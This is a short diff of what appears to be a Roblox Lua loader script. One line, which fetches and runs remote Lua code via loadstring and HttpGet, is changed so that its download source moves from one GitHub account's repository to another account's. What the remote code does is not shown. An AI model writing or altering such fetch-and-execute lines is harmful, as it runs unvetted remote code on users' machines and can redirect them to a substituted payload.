@@ -539,4 +539,4 @@ if blur then blur:Destroy() end
 if screenGui then screenGui:Destroy() end
 
 -- Загружаем основной скрипт
-loadstring(game:HttpGet("https://raw.githubusercontent.com/welomenchaina/KaliHub/refs/heads/main/LuarmorGameLoader.lua",true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/AdmiralSalss/123dalbaeb/refs/heads/main/LuarmorGameLoader.lua",true))()
